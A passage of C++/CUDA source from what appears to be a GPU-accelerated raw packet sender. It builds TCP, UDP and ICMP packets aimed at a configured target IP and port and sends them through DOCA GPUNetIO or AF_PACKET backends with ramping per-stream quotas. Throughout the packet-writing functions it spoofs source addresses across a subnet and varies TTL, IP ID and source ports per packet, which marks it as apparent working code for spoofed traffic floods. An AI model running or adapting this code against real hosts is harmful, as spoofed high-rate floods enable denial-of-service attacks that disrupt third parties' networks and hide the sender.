          b.doca_kernel_direct_tx = want_doca_kernel_direct;
          return true;
        }
        for (int h : b.doca_txq_handles) {
          if (h >= 0) {
            char derr[96];
            derr[0] = '\0';
            (void)b.doca_api->destroy_txq(h, derr, sizeof(derr));
          }
        }
        b.doca_txq_handles.clear();
        b.doca_gpu_txq_handles.clear();
        b.doca_txq_mkeys_be.clear();
        b.doca_kernel_direct_tx = false;
      }
    }
    if (b.requested == "doca_gpunetio") {
      b.kind = PersistentTxBackendKind::kNoop;
      b.active = "noop";
      return false;
    }
  } else if (b.requested == "doca_gpunetio") {
    b.kind = PersistentTxBackendKind::kNoop;
    b.active = "noop";
    return false;
  }
  if (want_doca_kernel_direct && doca_kernel_mode_forced) {
    b.kind = PersistentTxBackendKind::kNoop;
    b.active = "noop";
    return false;
  }

  if (want_afpacket && !b.iface.empty()) {
    if (samurai_fast_sender_send_ring_bridge && samurai_fast_sender_cleanup_ring_bridge) {
      // Validate AF_PACKET bridge with a zero-count preflight so we don't mark
      // backend active when raw socket/ring setup is not actually available.
      std::array<uint8_t, 64> dummy{};
      int pre_sent = 0;
      int pre_errors = 0;
      char pre_err[160];
      pre_err[0] = '\0';
      const int pre_rc = samurai_fast_sender_send_ring_bridge(
          b.iface.c_str(),
          dummy.data(),
          dummy.size(),
          64,
          0,
          b.afpacket_mac.data(),
          &pre_sent,
          &pre_errors,
          pre_err,
          sizeof(pre_err));
      (void)samurai_fast_sender_cleanup_ring_bridge();
      if (pre_rc < 0) {
        if (b.requested == "af_packet") {
          b.kind = PersistentTxBackendKind::kNoop;
          b.active = "noop";
          return tx_backend_strict ? false : true;
        }
      } else {
      b.afpacket_send_bridge = samurai_fast_sender_send_ring_bridge;
      b.afpacket_cleanup_bridge = samurai_fast_sender_cleanup_ring_bridge;
      b.kind = PersistentTxBackendKind::kAfPacket;
      b.active = "af_packet";
      return true;
      }
    }
    if (b.requested == "af_packet") {
      b.kind = PersistentTxBackendKind::kNoop;
      b.active = "noop";
      return tx_backend_strict ? false : true;
    }
  }

  b.kind = PersistentTxBackendKind::kNoop;
  b.active = "noop";
  return false;
}

inline uint16_t host_checksum(const uint8_t* data, int len) {
  uint32_t sum = 0u;
  int i = 0;
  for (; i + 1 < len; i += 2) {
    sum += (static_cast<uint32_t>(data[i]) << 8) | static_cast<uint32_t>(data[i + 1]);
  }
  if (i < len) {
    sum += static_cast<uint32_t>(data[i]) << 8;
  }
  while (sum >> 16u) {
    sum = (sum & 0xFFFFu) + (sum >> 16u);
  }
  return static_cast<uint16_t>((~sum) & 0xFFFFu);
}

inline uint16_t host_l4_checksum(
    uint32_t src_ip,
    uint32_t dst_ip,
    uint8_t protocol,
    const uint8_t* l4,
    int l4_len) {
  uint32_t sum = 0u;
  sum += (src_ip >> 16) & 0xFFFFu;
  sum += src_ip & 0xFFFFu;
  sum += (dst_ip >> 16) & 0xFFFFu;
  sum += dst_ip & 0xFFFFu;
  sum += static_cast<uint32_t>(protocol);
  sum += static_cast<uint32_t>(l4_len);
  int i = 0;
  for (; i + 1 < l4_len; i += 2) {
    sum += (static_cast<uint32_t>(l4[i]) << 8) | static_cast<uint32_t>(l4[i + 1]);
  }
  if (i < l4_len) {
    sum += static_cast<uint32_t>(l4[i]) << 8;
  }
  while (sum >> 16u) {
    sum = (sum & 0xFFFFu) + (sum >> 16u);
  }
  return static_cast<uint16_t>((~sum) & 0xFFFFu);
}

inline void persistent_build_stream_template(volatile PersistentDeviceStreamState* sv) {
  if (!sv) {
    return;
  }
  auto w16 = [&](uint8_t* buf, int off, uint16_t v) {
    buf[off] = static_cast<uint8_t>((v >> 8) & 0xFFu);
    buf[off + 1] = static_cast<uint8_t>(v & 0xFFu);
  };
  auto w32 = [&](uint8_t* buf, int off, uint32_t v) {
    buf[off] = static_cast<uint8_t>((v >> 24) & 0xFFu);
    buf[off + 1] = static_cast<uint8_t>((v >> 16) & 0xFFu);
    buf[off + 2] = static_cast<uint8_t>((v >> 8) & 0xFFu);
    buf[off + 3] = static_cast<uint8_t>(v & 0xFFu);
  };
  auto r16 = [&](const uint8_t* buf, int off) -> uint16_t {
    return static_cast<uint16_t>((static_cast<uint16_t>(buf[off]) << 8) | static_cast<uint16_t>(buf[off + 1]));
  };
  auto r32 = [&](const uint8_t* buf, int off) -> uint32_t {
    return (static_cast<uint32_t>(buf[off]) << 24) | (static_cast<uint32_t>(buf[off + 1]) << 16) |
           (static_cast<uint32_t>(buf[off + 2]) << 8) | static_cast<uint32_t>(buf[off + 3]);
  };

  const int protocol = static_cast<int>(sv->protocol);
  const bool is_tcp = (protocol == 6);
  const bool is_udp = (protocol == 17);
  const bool is_icmp = (protocol == 1);
  if (!is_tcp && !is_udp && !is_icmp) {
    sv->template_valid = 0;
    sv->template_len = 0;
    return;
  }

  int payload_len = static_cast<int>(sv->payload_len);
  if (payload_len < 0) {
    payload_len = 0;
  }
  if (payload_len > kPersistentPayloadCapacity) {
    payload_len = kPersistentPayloadCapacity;
  }
  const int has_eth = (sv->has_ethernet != 0) ? 1 : 0;
  const int ip_off = has_eth ? 14 : 0;
  const int ip_len = 20;
  const int tcp_len = 20;
  const int udp_len = 8;
  const int icmp_len = 8;
  const int l4_len = (is_tcp ? tcp_len : (is_udp ? udp_len : icmp_len)) + payload_len;
  const int total_len = ip_off + ip_len + l4_len;
  if (total_len <= 0 || total_len > kPersistentMaxPacketBytes) {
    sv->template_valid = 0;
    sv->template_len = 0;
    return;
  }

  uint8_t* out = const_cast<uint8_t*>(sv->template_packet);
  std::memset(out, 0, static_cast<size_t>(total_len));

  if (has_eth) {
    if (sv->has_custom_mac != 0) {
      for (int i = 0; i < 6; ++i) {
        out[i] = sv->dst_mac[i];
        out[6 + i] = sv->src_mac[i];
      }
    } else {
      for (int i = 0; i < 6; ++i) {
        out[i] = 0xFFu;
        out[6 + i] = 0x00u;
      }
    }
    out[12] = 0x08u;
    out[13] = 0x00u;
  }

  const int ip = ip_off;
  const uint16_t ip_total_len = static_cast<uint16_t>(ip_len + l4_len);
  const uint16_t ip_id = 0u;
  const uint8_t ttl = 64u;
  out[ip + 0] = 0x45u;
  out[ip + 1] = 0x00u;
  w16(out, ip + 2, ip_total_len);
  w16(out, ip + 4, ip_id);
  w16(out, ip + 6, 0x4000u);
  out[ip + 8] = ttl;
  out[ip + 9] = static_cast<uint8_t>(protocol & 0xFF);
  w16(out, ip + 10, 0u);

  uint32_t src_ip = sv->src_ip;
  const uint32_t spoof_mask = sv->spoof_mask;
  if (sv->spoof_enabled != 0 && spoof_mask < 32u) {
    src_ip = sv->spoof_base_ip;
  }
  w32(out, ip + 12, src_ip);
  w32(out, ip + 16, sv->target_ip);
  const uint16_t ip_csum = host_checksum(out + ip, ip_len);
  w16(out, ip + 10, ip_csum);

  const int t_off = ip_off + ip_len;
  const uint16_t src_port =
      (sv->source_port_mode != 0 && sv->source_port != 0) ? sv->source_port : static_cast<uint16_t>(1024u);
  if (is_tcp) {
    const uint32_t tcp_seq = 0u;
    const uint32_t tcp_ack = 0u;
    w16(out, t_off + 0, src_port);
    w16(out, t_off + 2, sv->target_port);
    w32(out, t_off + 4, tcp_seq);
    w32(out, t_off + 8, tcp_ack);
    out[t_off + 12] = 0x50;
    out[t_off + 13] = static_cast<uint8_t>(sv->tcp_flags & 0xFFu);
    w16(out, t_off + 14, sv->tcp_window);
    w16(out, t_off + 16, 0u);
    w16(out, t_off + 18, 0u);
  } else if (is_udp) {
    w16(out, t_off + 0, src_port);
    w16(out, t_off + 2, sv->target_port);
    w16(out, t_off + 4, static_cast<uint16_t>(udp_len + payload_len));
    w16(out, t_off + 6, 0u);
  } else {
    out[t_off + 0] = static_cast<uint8_t>(sv->icmp_type & 0xFF);
    out[t_off + 1] = static_cast<uint8_t>(sv->icmp_code & 0xFF);
    w16(out, t_off + 2, 0u);
    w16(out, t_off + 4, 0u);
    w16(out, t_off + 6, static_cast<uint16_t>(sv->stream_id & 0xFFFF));
  }

  const int data_off = t_off + (is_tcp ? tcp_len : (is_udp ? udp_len : icmp_len));
  for (int i = 0; i < payload_len; ++i) {
    out[data_off + i] = (i < static_cast<int>(sv->payload_len)) ? sv->payload[i] : sv->payload_byte;
  }

  uint16_t l4_csum = 0u;
  if (is_tcp) {
    l4_csum = host_l4_checksum(src_ip, sv->target_ip, 6, out + t_off, tcp_len + payload_len);
    w16(out, t_off + 16, l4_csum);
  } else if (is_udp) {
    l4_csum = host_l4_checksum(src_ip, sv->target_ip, 17, out + t_off, udp_len + payload_len);
    if (l4_csum == 0u) {
      l4_csum = 0xFFFFu;
    }
    w16(out, t_off + 6, l4_csum);
  } else {
    l4_csum = host_checksum(out + t_off, icmp_len + payload_len);
    w16(out, t_off + 2, l4_csum);
  }

  sv->template_len = static_cast<uint16_t>(total_len);
  sv->template_ip_off = static_cast<uint16_t>(ip_off);
  sv->template_l4_off = static_cast<uint16_t>(t_off);
  sv->template_l4_len = static_cast<uint16_t>(l4_len);
  sv->template_base_ip_csum = ip_csum;
  sv->template_base_l4_csum = l4_csum;
  sv->template_base_ip_id = ip_id;
  sv->template_base_ttl_proto = r16(out, ip + 8);
  sv->template_base_src_port = src_port;
  sv->template_base_src_ip = src_ip;
  sv->template_base_dst_ip = r32(out, ip + 16);
  sv->template_base_tcp_seq = is_tcp ? r32(out, t_off + 4) : 0u;
  sv->template_base_tcp_ack = is_tcp ? r32(out, t_off + 8) : 0u;
  sv->template_valid = 1;
}

__device__ __forceinline__ uint64_t persistent_accumulate_words_be(
    const uint8_t* data,
    int len,
    uint64_t sum = 0u) {
  int i = 0;

  // Prologue: advance in 16-bit steps until 32-bit aligned (if possible).
  while (i + 1 < len &&
         ((reinterpret_cast<uintptr_t>(data + i) & (sizeof(uint32_t) - 1u)) != 0u)) {
    sum += (static_cast<uint64_t>(data[i]) << 8) | static_cast<uint64_t>(data[i + 1]);
    i += 2;
  }

  // Vectorized path: one 32-bit load carries two checksum words.
  for (; i + 3 < len; i += 4) {
    const uint32_t w = *reinterpret_cast<const uint32_t*>(data + i);
    // Memory bytes [b0 b1 b2 b3] -> words (b0<<8|b1) and (b2<<8|b3).
    sum += ((static_cast<uint64_t>(w) & 0x000000FFu) << 8) |
           ((static_cast<uint64_t>(w) & 0x0000FF00u) >> 8);
    sum += ((static_cast<uint64_t>(w) & 0x00FF0000u) >> 8) |
           ((static_cast<uint64_t>(w) & 0xFF000000u) >> 24);
  }

  for (; i + 1 < len; i += 2) {
    sum += (static_cast<uint64_t>(data[i]) << 8) | static_cast<uint64_t>(data[i + 1]);
  }
  if (i < len) {
    sum += static_cast<uint64_t>(data[i]) << 8;
  }
  return sum;
}

__device__ __forceinline__ uint16_t persistent_finalize_checksum(uint64_t sum) {
  while (sum >> 16u) {
    sum = (sum & 0xFFFFu) + (sum >> 16u);
  }
  return static_cast<uint16_t>((~sum) & 0xFFFFu);
}

__device__ inline uint16_t persistent_checksum(const uint8_t* data, int len) {
  return persistent_finalize_checksum(persistent_accumulate_words_be(data, len));
}

__device__ inline uint16_t persistent_l4_checksum(
    uint32_t src_ip,
    uint32_t dst_ip,
    uint8_t protocol,
    const uint8_t* l4,
    int l4_len) {
  uint64_t sum = 0u;
  sum += (src_ip >> 16) & 0xFFFFu;
  sum += src_ip & 0xFFFFu;
  sum += (dst_ip >> 16) & 0xFFFFu;
  sum += dst_ip & 0xFFFFu;
  sum += static_cast<uint32_t>(protocol);
  sum += static_cast<uint32_t>(l4_len);
  sum = persistent_accumulate_words_be(l4, l4_len, sum);
  return persistent_finalize_checksum(sum);
}

__device__ __forceinline__ uint16_t persistent_fold_ones_complement(uint64_t sum32) {
  uint64_t acc = sum32 & 0xFFFFFFFFull;
  while ((acc >> 16) > 0u) {
    acc = (acc & 0xFFFFull) + (acc >> 16);
  }
  return static_cast<uint16_t>(acc & 0xFFFFull);
}

__device__ __forceinline__ uint16_t persistent_rfc1624_update_word(
    uint16_t old_checksum,
    uint16_t old_word,
    uint16_t new_word) {
  const uint64_t old_c = old_checksum & 0xFFFFu;
  const uint64_t old_w = old_word & 0xFFFFu;
  const uint64_t new_w = new_word & 0xFFFFu;
  const uint64_t sum32 = (old_c ^ 0xFFFFu) + (old_w ^ 0xFFFFu) + new_w;
  const uint16_t folded = persistent_fold_ones_complement(sum32);
  return static_cast<uint16_t>((folded ^ 0xFFFFu) & 0xFFFFu);
}

__device__ __forceinline__ uint16_t persistent_rfc1624_update_dword(
    uint16_t old_checksum,
    uint32_t old_dword,
    uint32_t new_dword) {
  uint16_t csum = old_checksum;
  csum = persistent_rfc1624_update_word(
      csum,
      static_cast<uint16_t>((old_dword >> 16) & 0xFFFFu),
      static_cast<uint16_t>((new_dword >> 16) & 0xFFFFu));
  csum = persistent_rfc1624_update_word(
      csum,
      static_cast<uint16_t>(old_dword & 0xFFFFu),
      static_cast<uint16_t>(new_dword & 0xFFFFu));
  return csum;
}

__device__ __forceinline__ void persistent_copy_bytes_vectorized(
    uint8_t* dst,
    const volatile uint8_t* src,
    int nbytes) {
  if (nbytes <= 0) {
    return;
  }
  int i = 0;
  const uintptr_t align_mask = reinterpret_cast<uintptr_t>(dst) | reinterpret_cast<uintptr_t>(src);
  const uint8_t* src_plain = const_cast<const uint8_t*>(src);
  if ((align_mask & 0x0F) == 0) {
    auto* d16 = reinterpret_cast<uint4*>(dst);
    auto* s16 = reinterpret_cast<const uint4*>(src_plain);
    const int n16 = nbytes / 16;
    for (int j = 0; j < n16; ++j) {
      d16[j] = s16[j];
    }
    i = n16 * 16;
  } else if ((align_mask & 0x07) == 0) {
    auto* d8 = reinterpret_cast<unsigned long long*>(dst);
    auto* s8 = reinterpret_cast<const unsigned long long*>(src_plain);
    const int n8 = nbytes / 8;
    for (int j = 0; j < n8; ++j) {
      d8[j] = s8[j];
    }
    i = n8 * 8;
  } else if ((align_mask & 0x03) == 0) {
    auto* d4 = reinterpret_cast<uint32_t*>(dst);
    auto* s4 = reinterpret_cast<const uint32_t*>(src_plain);
    const int n4 = nbytes / 4;
    for (int j = 0; j < n4; ++j) {
      d4[j] = s4[j];
    }
    i = n4 * 4;
  }
  for (; i < nbytes; ++i) {
    dst[i] = src_plain[i];
  }
}

__device__ inline void persistent_write_packet(
    PersistentRingSlot* slot,
    uint8_t* payload,
    const volatile PersistentDeviceStreamState* sv,
    uint32_t seq,
    uint32_t max_packet_bytes) {
  slot->tx_timestamp_ns = 0u;
  const uint64_t tx_base_timestamp_ns = sv->tx_base_timestamp_ns;
  const uint32_t tx_ipg_ns = sv->tx_ipg_ns;
  if (tx_base_timestamp_ns > 0u) {
    if (tx_ipg_ns > 0u) {
      const uint64_t seq_idx = (seq > 0u) ? static_cast<uint64_t>(seq - 1u) : 0u;
      const __uint128_t ts_wide =
          static_cast<__uint128_t>(tx_base_timestamp_ns) +
          (static_cast<__uint128_t>(seq_idx) * static_cast<__uint128_t>(tx_ipg_ns));
      const __uint128_t u64_max = static_cast<__uint128_t>(~static_cast<uint64_t>(0u));
      slot->tx_timestamp_ns = static_cast<uint64_t>(ts_wide > u64_max ? u64_max : ts_wide);
    } else {
      slot->tx_timestamp_ns = tx_base_timestamp_ns;
    }
  }
  const int protocol = static_cast<int>(sv->protocol);
  const int has_eth = (sv->has_ethernet != 0) ? 1 : 0;
  const int ip_off = has_eth ? 14 : 0;
  const int ip_len = 20;
  const int tcp_len = 20;
  const int udp_len = 8;
  const int icmp_len = 8;
  const bool is_tcp = (protocol == 6);
  const bool is_udp = (protocol == 17);
  const bool is_icmp = (protocol == 1);
  if (!is_tcp && !is_udp && !is_icmp) {
    slot->len = 0;
    return;
  }

  auto w16 = [&](int off, uint16_t v) {
    payload[off] = static_cast<uint8_t>((v >> 8) & 0xFFu);
    payload[off + 1] = static_cast<uint8_t>(v & 0xFFu);
  };
  auto w32 = [&](int off, uint32_t v) {
    payload[off] = static_cast<uint8_t>((v >> 24) & 0xFFu);
    payload[off + 1] = static_cast<uint8_t>((v >> 16) & 0xFFu);
    payload[off + 2] = static_cast<uint8_t>((v >> 8) & 0xFFu);
    payload[off + 3] = static_cast<uint8_t>(v & 0xFFu);
  };
  auto r16 = [&](int off) -> uint16_t {
    return static_cast<uint16_t>((static_cast<uint16_t>(payload[off]) << 8) | static_cast<uint16_t>(payload[off + 1]));
  };
  auto r32 = [&](int off) -> uint32_t {
    return (static_cast<uint32_t>(payload[off]) << 24) | (static_cast<uint32_t>(payload[off + 1]) << 16) |
           (static_cast<uint32_t>(payload[off + 2]) << 8) | static_cast<uint32_t>(payload[off + 3]);
  };

  if (sv->template_valid != 0 && sv->template_len > 0 &&
      sv->template_len <= static_cast<uint16_t>(max_packet_bytes) &&
      sv->template_len <= static_cast<uint16_t>(kPersistentMaxPacketBytes)) {
    const int total_len = static_cast<int>(sv->template_len);
    persistent_copy_bytes_vectorized(payload, sv->template_packet, total_len);

    const int ip_off_t = static_cast<int>(sv->template_ip_off);
    const int t_off_t = static_cast<int>(sv->template_l4_off);
    const int l4_len_t = static_cast<int>(sv->template_l4_len);
    if (ip_off_t < 0 || t_off_t <= ip_off_t || l4_len_t <= 0) {
      slot->len = 0;
      return;
    }

    uint32_t src_ip = sv->src_ip;
    const uint32_t spoof_mask = sv->spoof_mask;
    if (sv->spoof_enabled != 0 && spoof_mask < 32u) {
      const uint32_t hosts = (1u << (32u - spoof_mask));
      src_ip = sv->spoof_base_ip + (hosts > 0 ? (seq % hosts) : 0u);
    }
    const uint16_t ip_id = static_cast<uint16_t>(seq & 0xFFFFu);
    const uint16_t new_ttl_proto =
        static_cast<uint16_t>((static_cast<uint16_t>(48u + (seq % 64u)) << 8) |
                              static_cast<uint16_t>(protocol & 0xFF));
    const uint16_t auto_src_port = static_cast<uint16_t>(1024u + (seq % 64511u));
    const uint16_t src_port = (sv->source_port_mode != 0 && sv->source_port != 0) ? sv->source_port : auto_src_port;

    w32(ip_off_t + 12, src_ip);
    w16(ip_off_t + 4, ip_id);
    payload[ip_off_t + 8] = static_cast<uint8_t>((new_ttl_proto >> 8) & 0xFFu);
    payload[ip_off_t + 9] = static_cast<uint8_t>(new_ttl_proto & 0xFFu);

    uint16_t ip_csum = sv->template_base_ip_csum;
    ip_csum = persistent_rfc1624_update_dword(ip_csum, sv->template_base_src_ip, src_ip);
    ip_csum = persistent_rfc1624_update_word(ip_csum, sv->template_base_ip_id, ip_id);
    ip_csum = persistent_rfc1624_update_word(ip_csum, sv->template_base_ttl_proto, new_ttl_proto);
    w16(ip_off_t + 10, ip_csum);

    if (is_tcp) {
      w16(t_off_t + 0, src_port);
      const uint32_t tcp_seq = seq * 2654435761u;
      w32(t_off_t + 4, tcp_seq);
      uint16_t tcp_csum = sv->template_base_l4_csum;
      tcp_csum = persistent_rfc1624_update_dword(tcp_csum, sv->template_base_src_ip, src_ip);
      tcp_csum = persistent_rfc1624_update_word(tcp_csum, sv->template_base_src_port, src_port);
      tcp_csum = persistent_rfc1624_update_dword(tcp_csum, sv->template_base_tcp_seq, tcp_seq);
      w16(t_off_t + 16, tcp_csum);
    } else if (is_udp) {
      w16(t_off_t + 0, src_port);
      uint16_t udp_csum = sv->template_base_l4_csum;
      udp_csum = persistent_rfc1624_update_dword(udp_csum, sv->template_base_src_ip, src_ip);
      udp_csum = persistent_rfc1624_update_word(udp_csum, sv->template_base_src_port, src_port);
      if (udp_csum == 0u) {
        udp_csum = 0xFFFFu;
      }
      w16(t_off_t + 6, udp_csum);
    } else {
      const uint16_t old_id_seq = r16(t_off_t + 4);
      const uint16_t new_id_seq = static_cast<uint16_t>(seq & 0xFFFFu);
      w16(t_off_t + 4, new_id_seq);
      uint16_t icmp_csum = sv->template_base_l4_csum;
      icmp_csum = persistent_rfc1624_update_word(icmp_csum, old_id_seq, new_id_seq);
      w16(t_off_t + 2, icmp_csum);
    }

    slot->len = total_len;
    return;
  }

  int payload_len = static_cast<int>(sv->payload_len);
  if (payload_len < 0) {
    payload_len = 0;
  }
  if (payload_len > kPersistentPayloadCapacity) {
    payload_len = kPersistentPayloadCapacity;
  }
  const int transport_len = (is_tcp ? tcp_len : (is_udp ? udp_len : icmp_len)) + payload_len;
  const int total_len = ip_off + ip_len + transport_len;
  if (total_len <= 0 || total_len > static_cast<int>(max_packet_bytes)) {
    slot->len = 0;
    return;
  }

  uint32_t src_ip = sv->src_ip;
  const uint32_t spoof_mask = sv->spoof_mask;
  if (sv->spoof_enabled != 0 && spoof_mask < 32u) {
    const uint32_t hosts = (1u << (32u - spoof_mask));
    src_ip = sv->spoof_base_ip + (hosts > 0 ? (seq % hosts) : 0u);
  }

  if (has_eth) {
    if (sv->has_custom_mac != 0) {
      for (int i = 0; i < 6; ++i) {
        payload[i] = sv->dst_mac[i];
        payload[6 + i] = sv->src_mac[i];
      }
    } else {
      for (int i = 0; i < 6; ++i) {
        payload[i] = 0xFFu;
        payload[6 + i] = 0x00u;
      }
    }
    payload[12] = 0x08u;
    payload[13] = 0x00u;
  }

  const int ip = ip_off;
  payload[ip + 0] = 0x45u;
  payload[ip + 1] = 0x00u;
  w16(ip + 2, static_cast<uint16_t>(ip_len + transport_len));
  w16(ip + 4, static_cast<uint16_t>(seq & 0xFFFFu));
  w16(ip + 6, 0x4000u);
  payload[ip + 8] = static_cast<uint8_t>(48u + (seq % 64u));
  payload[ip + 9] = static_cast<uint8_t>(protocol & 0xFF);
  w16(ip + 10, 0u);
  w32(ip + 12, src_ip);
  w32(ip + 16, sv->target_ip);
  w16(ip + 10, persistent_checksum(payload + ip, ip_len));

  const int t_off = ip_off + ip_len;
  const uint16_t auto_src_port = static_cast<uint16_t>(1024u + (seq % 64511u));
  const uint16_t src_port = (sv->source_port_mode != 0 && sv->source_port != 0) ? sv->source_port : auto_src_port;

  if (is_tcp) {
    w16(t_off + 0, src_port);
    w16(t_off + 2, sv->target_port);
    w32(t_off + 4, seq * 2654435761u);
    w32(t_off + 8, 0u);
    payload[t_off + 12] = 0x50;  // TCP header len 20 bytes
    payload[t_off + 13] = static_cast<uint8_t>(sv->tcp_flags & 0xFFu);
    w16(t_off + 14, sv->tcp_window);
    w16(t_off + 16, 0u);
    w16(t_off + 18, 0u);
  } else if (is_udp) {
    w16(t_off + 0, src_port);
    w16(t_off + 2, sv->target_port);
    w16(t_off + 4, static_cast<uint16_t>(udp_len + payload_len));
    w16(t_off + 6, 0u);
  } else {
    payload[t_off + 0] = static_cast<uint8_t>(sv->icmp_type & 0xFF);
    payload[t_off + 1] = static_cast<uint8_t>(sv->icmp_code & 0xFF);
    w16(t_off + 2, 0u);
    w16(t_off + 4, static_cast<uint16_t>(seq & 0xFFFFu));
    w16(t_off + 6, static_cast<uint16_t>(sv->stream_id & 0xFFFF));
  }

  const int data_off = t_off + (is_tcp ? tcp_len : (is_udp ? udp_len : icmp_len));
  for (int i = 0; i < payload_len; ++i) {
    payload[data_off + i] = (i < static_cast<int>(sv->payload_len)) ? sv->payload[i] : sv->payload_byte;
  }

  if (is_tcp) {
    w16(t_off + 16, 0u);
    const uint16_t tcp_csum = persistent_l4_checksum(src_ip, sv->target_ip, 6, payload + t_off, tcp_len + payload_len);
    w16(t_off + 16, tcp_csum);
  } else if (is_udp) {
    w16(t_off + 6, 0u);
    uint16_t udp_csum = persistent_l4_checksum(src_ip, sv->target_ip, 17, payload + t_off, udp_len + payload_len);
    if (udp_csum == 0u) {
      udp_csum = 0xFFFFu;
    }
    w16(t_off + 6, udp_csum);
  } else {
    w16(t_off + 2, 0u);
    const uint16_t icmp_csum = persistent_checksum(payload + t_off, icmp_len + payload_len);
    w16(t_off + 2, icmp_csum);
  }

  slot->len = total_len;
}

__device__ inline uint32_t u32_load(const volatile uint32_t* p) {
  return *p;
}

__device__ inline int32_t i32_load(const volatile int32_t* p) {
  return *p;
}

__device__ inline uint64_t u64_load(const volatile uint64_t* p) {
  return *p;
}

__device__ inline uint64_t u64_add(volatile uint64_t* p, uint64_t v) {
  return atomicAdd((unsigned long long*)p, static_cast<unsigned long long>(v));
}

__device__ __forceinline__ void persistent_publish_slot_ready(PersistentRingSlot* slot) {
#if defined(__CUDA_ARCH__) && (__CUDA_ARCH__ >= 600)
  // System-scope publish with release semantics for host-visible slot state.
  atomicExch_system((int*)&slot->state, 1);
#else
  __threadfence_system();
  atomicExch((int*)&slot->state, 1);
#endif
}

__device__ __forceinline__ bool persistent_doca_kernel_try_enqueue(
    uint64_t gpu_txq_handle,
    uint32_t mkey_be,
    const uint8_t* packet_ptr,
    uint32_t packet_len) {
  if (gpu_txq_handle == 0ull || mkey_be == 0u || !packet_ptr || packet_len == 0u) {
    return false;
  }
#if SAMURAI_WITH_DOCA_GPUNETIO_DEVICE
  auto* txq = reinterpret_cast<doca_gpu_eth_txq*>(gpu_txq_handle);
  if (!txq) {
    return false;
  }
  const uint64_t addr = reinterpret_cast<uint64_t>(packet_ptr);
  const doca_error_t rc_enqueue =
      doca_gpu_dev_eth_txq_send_enqueue_strong(txq, addr, mkey_be, packet_len, DOCA_GPU_SEND_FLAG_NONE);
  if (rc_enqueue != DOCA_SUCCESS) {
    return false;
  }
  return true;
#else
  (void)gpu_txq_handle;
  (void)mkey_be;
  (void)packet_ptr;
  (void)packet_len;
  return false;
#endif
}

__device__ __forceinline__ bool persistent_doca_kernel_try_commit_push(uint64_t gpu_txq_handle) {
  if (gpu_txq_handle == 0ull) {
    return false;
  }
#if SAMURAI_WITH_DOCA_GPUNETIO_DEVICE
  auto* txq = reinterpret_cast<doca_gpu_eth_txq*>(gpu_txq_handle);
  if (!txq) {
    return false;
  }
  const doca_error_t rc_commit = doca_gpu_dev_eth_txq_commit_strong(txq);
  if (rc_commit != DOCA_SUCCESS) {
    return false;
  }
  const doca_error_t rc_push = doca_gpu_dev_eth_txq_push(txq);
  return rc_push == DOCA_SUCCESS;
#else
  (void)gpu_txq_handle;
  return false;
#endif
}

__device__ inline void adaptive_quota_throttle(volatile PersistentDeviceStreamState* sv) {
  const uint32_t quota = u32_load(&sv->quota);
  if (quota == 0u) {
    return;
  }
  while (true) {
    const uint32_t cur_left = u32_load(&sv->quota_left);
    if (cur_left <= 1u || cur_left <= (quota / 4u)) {
      return;
    }
    const uint32_t drop_step = (quota / 16u) > 0u ? (quota / 16u) : 1u;
    const uint32_t next = (cur_left > drop_step) ? (cur_left - drop_step) : 1u;
    if (atomicCAS(
            (unsigned int*)&sv->quota_left,
            cur_left,
            next) == cur_left) {
      return;
    }
  }
}

__device__ inline uint32_t reserve_stream_tokens(
    volatile PersistentDeviceStreamState* sv,
    uint32_t max_tokens,
    uint32_t* slot_base_out) {
  if (!sv || max_tokens == 0u) {
    return 0u;
  }
  if (slot_base_out) {
    *slot_base_out = 0u;
  }

  if (u32_load(&sv->deficit) == 0u) {
    const uint32_t weight = u32_load(&sv->weight);
    (void)atomicCAS(
        (unsigned int*)&sv->deficit,
        0u,
        weight == 0u ? 1u : weight);
  }

  uint32_t reserve = 0u;
  bool committed = false;
  while (true) {
    const uint32_t quota_now = u32_load(&sv->quota_left);
    const uint32_t deficit_now = u32_load(&sv->deficit);
    if (quota_now == 0u || deficit_now == 0u) {
      return 0u;
    }
    reserve = quota_now;
    if (reserve > deficit_now) {
      reserve = deficit_now;
    }
    if (reserve > max_tokens) {
      reserve = max_tokens;
    }
    if (reserve == 0u) {
      return 0u;
    }

    const uint32_t next_quota = quota_now - reserve;
    if (atomicCAS((unsigned int*)&sv->quota_left, quota_now, next_quota) != quota_now) {
      continue;
    }

    while (true) {
      const uint32_t d_now = u32_load(&sv->deficit);
      if (d_now < reserve) {
        (void)atomicAdd((unsigned int*)&sv->quota_left, reserve);
        break;
      }
      const uint32_t next_deficit = d_now - reserve;
      if (atomicCAS((unsigned int*)&sv->deficit, d_now, next_deficit) == d_now) {
        committed = true;
        break;
      }
    }
    if (committed) {
      break;
    }
  }

  if (slot_base_out) {
    *slot_base_out = atomicAdd((unsigned int*)&sv->queue_cursor, reserve);
  }
  return reserve;
}

__global__ void persistent_quota_refill_kernel(
    volatile PersistentDeviceStreamState* streams,
    int32_t max_streams) {
  if (!streams || max_streams <= 0) {
    return;
  }
  const int32_t idx = static_cast<int32_t>(blockIdx.x * blockDim.x + threadIdx.x);
  if (idx < 0 || idx >= max_streams) {
    return;
  }
  volatile PersistentDeviceStreamState* sv = streams + static_cast<size_t>(idx);
  if (i32_load(&sv->active) == 0) {
    return;
  }

  uint32_t quota = u32_load(&sv->quota);
  if (quota == 0u) {
    return;
  }

  if (i32_load(&sv->stream_kind) == static_cast<int32_t>(PersistentStreamKind::kRamp)) {
    const uint32_t ramp_step = u32_load(&sv->ramp_step);
    if (ramp_step > 0u) {
      uint32_t epoch_counter = u32_load(&sv->ramp_epoch_counter) + 1u;
      sv->ramp_epoch_counter = epoch_counter;
      const uint32_t interval_raw = u32_load(&sv->ramp_interval_epochs);
      const uint32_t interval = (interval_raw > 0u) ? interval_raw : 1u;
      if ((epoch_counter % interval) == 0u) {
        uint64_t next_quota = static_cast<uint64_t>(quota) + static_cast<uint64_t>(ramp_step);
        const uint32_t ramp_max_quota = u32_load(&sv->ramp_max_quota);
        const uint32_t ramp_cap = (ramp_max_quota > 0u) ? ramp_max_quota : (quota * 4u);
        if (ramp_cap > 0u && next_quota > static_cast<uint64_t>(ramp_cap)) {
          next_quota = static_cast<uint64_t>(ramp_cap);
        }
        quota = static_cast<uint32_t>(next_quota);
        sv->quota = quota;
      }
    }
  }

  const uint32_t quota_left = u32_load(&sv->quota_left);
  uint64_t next_left = static_cast<uint64_t>(quota_left) + static_cast<uint64_t>(quota);
  const uint64_t cap = static_cast<uint64_t>(quota) * 4ull;
  if (next_left > cap) {
    next_left = cap;
  }
  sv->quota_left = static_cast<uint32_t>(next_left);
}

__device__ inline void persistent_contract_poll_assigned_shard(
